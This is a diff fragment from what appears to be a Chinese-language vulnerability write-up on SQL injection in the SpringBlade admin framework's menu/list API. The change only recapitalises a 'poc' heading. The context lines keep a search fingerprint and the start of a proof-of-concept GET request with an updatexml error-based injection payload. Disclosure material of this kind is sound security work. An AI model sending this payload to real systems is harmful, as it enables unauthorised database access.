@@ -8,7 +8,7 @@ SpringBlade 后台框架 menu/list 存在SQL注入漏洞，攻击者除了可以
 body="https://bladex.vip"
 ```
 
-## poc
+## POC
 
 ```yaml
 GET /api/blade-system/menu/list?updatexml(1,concat(0x7e,md5(1),0x7e),1)=1 HTTP/1.1
